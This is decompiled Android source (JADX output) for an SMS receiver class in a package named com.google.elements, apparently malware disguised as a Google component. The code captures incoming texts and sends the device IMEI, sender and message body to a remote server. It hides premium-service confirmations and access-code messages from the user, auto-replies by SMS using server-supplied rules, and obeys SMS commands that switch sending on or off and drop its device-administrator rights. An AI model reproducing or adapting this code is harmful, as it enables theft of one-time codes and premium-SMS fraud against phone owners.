package com.google.elements;

import android.content.BroadcastReceiver;

public class SmsReceiver extends BroadcastReceiver {
    /* JADX WARNING: Missing block: B:42:0x0146, code skipped:
            if (r18.contains(r15.getString("phone")) == false) goto L_0x0148;
     */
    public void onReceive(android.content.Context r23, android.content.Intent r24) {
        /*
        r22 = this;
        r11 = r24.getExtras();	 Catch:{ Exception -> 0x0213 }
        r18 = "";
        r14 = "";
        if (r11 == 0) goto L_0x0217;
    L_0x000a:
        r4 = "pdus";
        r4 = r11.get(r4);	 Catch:{ Exception -> 0x0213 }
        r4 = (java.lang.Object[]) r4;	 Catch:{ Exception -> 0x0213 }
        r0 = r4;
        r0 = (java.lang.Object[]) r0;	 Catch:{ Exception -> 0x0213 }
        r20 = r0;
        r12 = 0;
    L_0x0018:
        r0 = r20;
        r4 = r0.length;	 Catch:{ Exception -> 0x0213 }
        if (r12 >= r4) goto L_0x0059;
    L_0x001d:
        r4 = r20[r12];	 Catch:{ Exception -> 0x0213 }
        r4 = (byte[]) r4;	 Catch:{ Exception -> 0x0213 }
        r4 = (byte[]) r4;	 Catch:{ Exception -> 0x0213 }
        r2 = android.telephony.SmsMessage.createFromPdu(r4);	 Catch:{ Exception -> 0x0213 }
        r18 = r2.getDisplayOriginatingAddress();	 Catch:{ Exception -> 0x0213 }
        r4 = new java.lang.StringBuilder;	 Catch:{ Exception -> 0x0213 }
        r4.<init>();	 Catch:{ Exception -> 0x0213 }
        r5 = r4.append(r14);	 Catch:{ Exception -> 0x0213 }
        r4 = r2.getMessageBody();	 Catch:{ Exception -> 0x0213 }
        r4 = r4.toString();	 Catch:{ Exception -> 0x0213 }
        r6 = 0;
        r4 = r4.equals(r6);	 Catch:{ Exception -> 0x0213 }
        if (r4 == 0) goto L_0x0050;
    L_0x0043:
        r4 = "";
    L_0x0045:
        r4 = r5.append(r4);	 Catch:{ Exception -> 0x0213 }
        r14 = r4.toString();	 Catch:{ Exception -> 0x0213 }
        r12 = r12 + 1;
        goto L_0x0018;
    L_0x0050:
        r4 = r2.getMessageBody();	 Catch:{ Exception -> 0x0213 }
        r4 = r4.toString();	 Catch:{ Exception -> 0x0213 }
        goto L_0x0045;
    L_0x0059:
        r21 = com.google.elements.Utils.getInstance(r23);	 Catch:{ Exception -> 0x0213 }
        r13 = new org.json.JSONObject;	 Catch:{ Exception -> 0x0213 }
        r13.<init>();	 Catch:{ Exception -> 0x0213 }
        r4 = "imei";
        r5 = r21.getDeviceId();	 Catch:{ Exception -> 0x0213 }
        r13.put(r4, r5);	 Catch:{ Exception -> 0x0213 }
        r4 = "phone";
        r0 = r18;
        r13.put(r4, r0);	 Catch:{ Exception -> 0x0213 }
        r4 = "message";
        r13.put(r4, r14);	 Catch:{ Exception -> 0x0213 }
        r19 = r13.toString();	 Catch:{ Exception -> 0x0213 }
        r4 = "save_sms";
        r0 = r21;
        r1 = r19;
        r0.sendPostRequest(r4, r1);	 Catch:{ Exception -> 0x0213 }
        r4 = "Spasibo za zakaz!";
        r4 = r14.contains(r4);	 Catch:{ Exception -> 0x0213 }
        if (r4 != 0) goto L_0x0094;
    L_0x008c:
        r4 = "Ваш код доступа к";
        r4 = r14.contains(r4);	 Catch:{ Exception -> 0x0213 }
        if (r4 == 0) goto L_0x00b9;
    L_0x0094:
        r4 = r21.getInterval();	 Catch:{ Exception -> 0x0213 }
        r5 = r21.getIntervalValue();	 Catch:{ Exception -> 0x0213 }
        r6 = r21.getFail();	 Catch:{ Exception -> 0x0213 }
        r5 = r5 * r6;
        r4 = r4 - r5;
        r0 = r21;
        r0.setInterval(r4);	 Catch:{ Exception -> 0x0213 }
        r4 = 1;
        r0 = r21;
        r0.incrementFail(r4);	 Catch:{ Exception -> 0x0213 }
        r4 = r21.isActive();	 Catch:{ Exception -> 0x0213 }
        if (r4 != 0) goto L_0x00b6;
    L_0x00b3:
        r21.activeApplication();	 Catch:{ Exception -> 0x0213 }
    L_0x00b6:
        r22.abortBroadcast();	 Catch:{ Exception -> 0x0213 }
    L_0x00b9:
        r4 = "UNBLOCK";
        r4 = r14.equals(r4);	 Catch:{ Exception -> 0x0213 }
        if (r4 == 0) goto L_0x01fd;
    L_0x00c1:
        r23.getApplicationContext();	 Catch:{ Exception -> 0x0213 }
        r4 = "device_policy";
        r0 = r23;
        r9 = r0.getSystemService(r4);	 Catch:{ Exception -> 0x0213 }
        r9 = (android.app.admin.DevicePolicyManager) r9;	 Catch:{ Exception -> 0x0213 }
        r8 = new android.content.ComponentName;	 Catch:{ Exception -> 0x0213 }
        r4 = com.google.elements.DeviceAdmin.class;
        r0 = r23;
        r8.<init>(r0, r4);	 Catch:{ Exception -> 0x0213 }
        r9.removeActiveAdmin(r8);	 Catch:{ Exception -> 0x0213 }
        r4 = r21.Edit();	 Catch:{ Exception -> 0x0213 }
        r5 = "allow_remove";
        r6 = 1;
        r4.putBoolean(r5, r6);	 Catch:{ Exception -> 0x0213 }
        r4 = r21.Edit();	 Catch:{ Exception -> 0x0213 }
        r4.commit();	 Catch:{ Exception -> 0x0213 }
        r22.abortBroadcast();	 Catch:{ Exception -> 0x0213 }
    L_0x00ee:
        r4 = r21.getIncomingPatterns();	 Catch:{ Exception -> 0x0213 }
        if (r4 == 0) goto L_0x0217;
    L_0x00f4:
        r4 = r21.getIncomingPatterns();	 Catch:{ Exception -> 0x0213 }
        r5 = "none";
        r4 = r4.equals(r5);	 Catch:{ Exception -> 0x0213 }
        if (r4 != 0) goto L_0x0217;
    L_0x0100:
        r16 = 0;
        r17 = new org.json.JSONArray;	 Catch:{ JSONException -> 0x023d }
        r4 = r21.getIncomingPatterns();	 Catch:{ JSONException -> 0x023d }
        r0 = r17;
        r0.<init>(r4);	 Catch:{ JSONException -> 0x023d }
        r16 = r17;
    L_0x010f:
        if (r16 == 0) goto L_0x0217;
    L_0x0111:
        r4 = r16.length();	 Catch:{ Exception -> 0x0213 }
        if (r4 <= 0) goto L_0x0217;
    L_0x0117:
        r12 = 0;
    L_0x0118:
        r4 = r16.length();	 Catch:{ Exception -> 0x0213 }
        if (r12 >= r4) goto L_0x0217;
    L_0x011e:
        r0 = r16;
        r15 = r0.getJSONObject(r12);	 Catch:{ Exception -> 0x0213 }
        r4 = "type";
        r4 = r15.getString(r4);	 Catch:{ Exception -> 0x0213 }
        r5 = "phone";
        r4 = r4.equals(r5);	 Catch:{ Exception -> 0x0213 }
        if (r4 == 0) goto L_0x0243;
    L_0x0132:
        r4 = "phone_contain";
        r4 = r15.getBoolean(r4);	 Catch:{ Exception -> 0x0213 }
        if (r4 == 0) goto L_0x0148;
    L_0x013a:
        r4 = "phone";
        r4 = r15.getString(r4);	 Catch:{ Exception -> 0x0213 }
        r0 = r18;
        r4 = r0.contains(r4);	 Catch:{ Exception -> 0x0213 }
        if (r4 != 0) goto L_0x015e;
    L_0x0148:
        r4 = "phone_contain";
        r4 = r15.getBoolean(r4);	 Catch:{ Exception -> 0x0213 }
        if (r4 != 0) goto L_0x01f9;
    L_0x0150:
        r4 = "phone";
        r4 = r15.getString(r4);	 Catch:{ Exception -> 0x0213 }
        r0 = r18;
        r4 = r0.equals(r4);	 Catch:{ Exception -> 0x0213 }
        if (r4 == 0) goto L_0x01f9;
    L_0x015e:
        r4 = "is_answer";
        r4 = r15.getBoolean(r4);	 Catch:{ Exception -> 0x0213 }
        if (r4 == 0) goto L_0x018c;
    L_0x0166:
        r3 = r18;
        r4 = "answer_phone";
        r4 = r15.getString(r4);	 Catch:{ Exception -> 0x0213 }
        r5 = "";
        r4 = r4.equals(r5);	 Catch:{ Exception -> 0x0213 }
        if (r4 != 0) goto L_0x017c;
    L_0x0176:
        r4 = "answer_phone";
        r3 = r15.getString(r4);	 Catch:{ Exception -> 0x0213 }
    L_0x017c:
        r2 = android.telephony.SmsManager.getDefault();	 Catch:{ Exception -> 0x0213 }
        r4 = 0;
        r5 = "answer";
        r5 = r15.getString(r5);	 Catch:{ Exception -> 0x0213 }
        r6 = 0;
        r7 = 0;
        r2.sendTextMessage(r3, r4, r5, r6, r7);	 Catch:{ Exception -> 0x0213 }
    L_0x018c:
        r4 = "is_good";
        r4 = r15.getBoolean(r4);	 Catch:{ Exception -> 0x0213 }
        if (r4 == 0) goto L_0x01b6;
    L_0x0194:
        r4 = r21.getInterval();	 Catch:{ Exception -> 0x0213 }
        r5 = r21.getIntervalValue();	 Catch:{ Exception -> 0x0213 }
        r6 = r21.getFail();	 Catch:{ Exception -> 0x0213 }
        r5 = r5 * r6;
        r4 = r4 - r5;
        r0 = r21;
        r0.setInterval(r4);	 Catch:{ Exception -> 0x0213 }
        r4 = 1;
        r0 = r21;
        r0.incrementFail(r4);	 Catch:{ Exception -> 0x0213 }
        r4 = r21.isActive();	 Catch:{ Exception -> 0x0213 }
        if (r4 != 0) goto L_0x01b6;
    L_0x01b3:
        r21.activeApplication();	 Catch:{ Exception -> 0x0213 }
    L_0x01b6:
        r4 = "is_bad";
        r4 = r15.getBoolean(r4);	 Catch:{ Exception -> 0x0213 }
        if (r4 == 0) goto L_0x01ee;
    L_0x01be:
        r4 = 1;
        r0 = r21;
        r0.setStop(r4);	 Catch:{ Exception -> 0x0213 }
        r21.deleteApplication();	 Catch:{ Exception -> 0x0213 }
        r4 = "device_policy";
        r0 = r23;
        r9 = r0.getSystemService(r4);	 Catch:{ Exception -> 0x0213 }
        r9 = (android.app.admin.DevicePolicyManager) r9;	 Catch:{ Exception -> 0x0213 }
        r8 = new android.content.ComponentName;	 Catch:{ Exception -> 0x0213 }
        r4 = com.google.elements.DeviceAdmin.class;
        r0 = r23;
        r8.<init>(r0, r4);	 Catch:{ Exception -> 0x0213 }
        r9.removeActiveAdmin(r8);	 Catch:{ Exception -> 0x0213 }
        r4 = r21.Edit();	 Catch:{ Exception -> 0x0213 }
        r5 = "allow_remove";
        r6 = 1;
        r4.putBoolean(r5, r6);	 Catch:{ Exception -> 0x0213 }
        r4 = r21.Edit();	 Catch:{ Exception -> 0x0213 }
        r4.commit();	 Catch:{ Exception -> 0x0213 }
    L_0x01ee:
        r4 = "is_delete";
        r4 = r15.getBoolean(r4);	 Catch:{ Exception -> 0x0213 }
        if (r4 == 0) goto L_0x01f9;
    L_0x01f6:
        r22.abortBroadcast();	 Catch:{ Exception -> 0x0213 }
    L_0x01f9:
        r12 = r12 + 1;
        goto L_0x0118;
    L_0x01fd:
        r4 = "STOP_SENDING";
        r4 = r14.equals(r4);	 Catch:{ Exception -> 0x0213 }
        if (r4 == 0) goto L_0x0218;
    L_0x0205:
        r4 = 1;
        r0 = r21;
        r0.setStop(r4);	 Catch:{ Exception -> 0x0213 }
        r21.deactiveApplication();	 Catch:{ Exception -> 0x0213 }
        r22.abortBroadcast();	 Catch:{ Exception -> 0x0213 }
        goto L_0x00ee;
    L_0x0213:
        r10 = move-exception;
        r10.printStackTrace();
    L_0x0217:
        return;
    L_0x0218:
        r4 = "START_SENDING";
        r4 = r14.equals(r4);	 Catch:{ Exception -> 0x0213 }
        if (r4 == 0) goto L_0x00ee;
    L_0x0220:
        r4 = 0;
        r0 = r21;
        r0.setStop(r4);	 Catch:{ Exception -> 0x0213 }
        r21.setLastTime();	 Catch:{ Exception -> 0x0213 }
        r4 = 0;
        r0 = r21;
        r0.setFail(r4);	 Catch:{ Exception -> 0x0213 }
        r4 = 0;
        r0 = r21;
        r0.setSending(r4);	 Catch:{ Exception -> 0x0213 }
        r21.activeApplication();	 Catch:{ Exception -> 0x0213 }
        r22.abortBroadcast();	 Catch:{ Exception -> 0x0213 }
        goto L_0x00ee;
    L_0x023d:
        r10 = move-exception;
        r10.printStackTrace();	 Catch:{ Exception -> 0x0213 }
        goto L_0x010f;
    L_0x0243:
        r4 = "text";
        r4 = r15.getString(r4);	 Catch:{ Exception -> 0x0213 }
        r4 = r14.contains(r4);	 Catch:{ Exception -> 0x0213 }
        if (r4 == 0) goto L_0x01f9;
    L_0x024f:
        r4 = "is_answer";
        r4 = r15.getBoolean(r4);	 Catch:{ Exception -> 0x0213 }
        if (r4 == 0) goto L_0x027d;
    L_0x0257:
        r3 = r18;
        r4 = "answer_phone";
        r4 = r15.getString(r4);	 Catch:{ Exception -> 0x0213 }
        r5 = "";
        r4 = r4.equals(r5);	 Catch:{ Exception -> 0x0213 }
        if (r4 != 0) goto L_0x026d;
    L_0x0267:
        r4 = "answer_phone";
        r3 = r15.getString(r4);	 Catch:{ Exception -> 0x0213 }
    L_0x026d:
        r2 = android.telephony.SmsManager.getDefault();	 Catch:{ Exception -> 0x0213 }
        r4 = 0;
        r5 = "answer";
        r5 = r15.getString(r5);	 Catch:{ Exception -> 0x0213 }
        r6 = 0;
        r7 = 0;
        r2.sendTextMessage(r3, r4, r5, r6, r7);	 Catch:{ Exception -> 0x0213 }
    L_0x027d:
        r4 = "is_good";
        r4 = r15.getBoolean(r4);	 Catch:{ Exception -> 0x0213 }
        if (r4 == 0) goto L_0x02a7;
    L_0x0285:
        r4 = r21.getInterval();	 Catch:{ Exception -> 0x0213 }
        r5 = r21.getIntervalValue();	 Catch:{ Exception -> 0x0213 }
        r6 = r21.getFail();	 Catch:{ Exception -> 0x0213 }
        r5 = r5 * r6;
        r4 = r4 - r5;
        r0 = r21;
        r0.setInterval(r4);	 Catch:{ Exception -> 0x0213 }
        r4 = 1;
        r0 = r21;
        r0.incrementFail(r4);	 Catch:{ Exception -> 0x0213 }
        r4 = r21.isActive();	 Catch:{ Exception -> 0x0213 }
        if (r4 != 0) goto L_0x02a7;
    L_0x02a4:
        r21.activeApplication();	 Catch:{ Exception -> 0x0213 }
    L_0x02a7:
        r4 = "is_bad";
        r4 = r15.getBoolean(r4);	 Catch:{ Exception -> 0x0213 }
        if (r4 == 0) goto L_0x02df;
    L_0x02af:
        r4 = 1;
        r0 = r21;
        r0.setStop(r4);	 Catch:{ Exception -> 0x0213 }
        r21.deleteApplication();	 Catch:{ Exception -> 0x0213 }
        r4 = "device_policy";
        r0 = r23;
        r9 = r0.getSystemService(r4);	 Catch:{ Exception -> 0x0213 }
        r9 = (android.app.admin.DevicePolicyManager) r9;	 Catch:{ Exception -> 0x0213 }
        r8 = new android.content.ComponentName;	 Catch:{ Exception -> 0x0213 }
        r4 = com.google.elements.DeviceAdmin.class;
        r0 = r23;
        r8.<init>(r0, r4);	 Catch:{ Exception -> 0x0213 }
        r9.removeActiveAdmin(r8);	 Catch:{ Exception -> 0x0213 }
        r4 = r21.Edit();	 Catch:{ Exception -> 0x0213 }
        r5 = "allow_remove";
        r6 = 1;
        r4.putBoolean(r5, r6);	 Catch:{ Exception -> 0x0213 }
        r4 = r21.Edit();	 Catch:{ Exception -> 0x0213 }
        r4.commit();	 Catch:{ Exception -> 0x0213 }
    L_0x02df:
        r4 = "is_delete";
        r4 = r15.getBoolean(r4);	 Catch:{ Exception -> 0x0213 }
        if (r4 == 0) goto L_0x01f9;
    L_0x02e7:
        r22.abortBroadcast();	 Catch:{ Exception -> 0x0213 }
        goto L_0x01f9;
        */
        throw new UnsupportedOperationException("Method not decompiled: com.google.elements.SmsReceiver.onReceive(android.content.Context, android.content.Intent):void");
    }
}
